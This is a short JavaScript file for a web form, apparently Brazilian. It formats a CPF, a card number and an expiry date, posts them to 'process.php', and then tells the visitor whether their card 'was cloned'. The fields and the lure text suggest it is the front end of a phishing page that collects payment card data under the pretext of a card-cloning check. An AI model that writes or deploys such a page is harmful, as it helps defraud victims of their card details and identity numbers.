function formatCPF(value) {
  value = value.replace(/\D/g, '');
  value = value.replace(/(\d{3})(\d)/, '$1.$2');
  value = value.replace(/(\d{3})(\d)/, '$1.$2');
  value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
  return value;
}

function formatCard(value) {
  value = value.replace(/\D/g, '');
  value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
  return value;
}

function formatDate(value) {
  value = value.replace(/\D/g, '');
  if(value.length > 2) {
    value = value.substring(0,2) + '/' + value.substring(2,4);
  }
  return value;
}

document.getElementById("cpf").addEventListener("input", function(e) {
  e.target.value = formatCPF(e.target.value);
});

document.getElementById("numero_cartao").addEventListener("input", function(e) {
  e.target.value = formatCard(e.target.value);
});

document.getElementById("validade").addEventListener("input", function(e) {
  e.target.value = formatDate(e.target.value);
});

document.getElementById("cardForm").addEventListener("submit", function(e) {
  e.preventDefault();

  let formData = new FormData(this);

  fetch("process.php", {
    method: "POST",
    body: formData
  })
  .then(response => response.json())
  .then(data => {
    let messageDiv = document.getElementById("responseMessage");
    if (data.status === "clonado") {
      messageDiv.textContent = "⚠️ SEU CARTÃO FOI CLONADO!";
      messageDiv.className = "message error";
    } else {
      messageDiv.textContent = "✅ SEU CARTÃO NÃO FOI CLONADO";
      messageDiv.className = "message success";
    }
  })
  .catch(error => {
    console.error("Erro:", error);
  });
});
